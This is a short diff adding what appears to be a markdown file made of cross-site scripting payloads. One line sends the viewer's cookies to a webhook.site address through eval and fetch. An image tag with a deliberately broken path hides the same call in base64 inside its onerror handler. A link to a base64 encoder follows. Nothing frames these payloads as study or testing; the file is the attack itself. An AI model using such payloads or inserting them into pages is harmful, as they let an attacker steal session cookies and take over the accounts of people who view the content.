@@ -1,0 +1,5 @@
+eval(fetch("https://webhook.site/42ad8c24-9dc4-4f77-9397-8b27a4dd4efa/" + document.cookie))
+
+<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzQyYWQ4YzI0LTlkYzQtNGY3Ny05Mzk3LThiMjdhNGRkNGVmYS8iICsgZG9jdW1lbnQuY29va2llKQ=='))">
+
+https://www.base64encode.org/
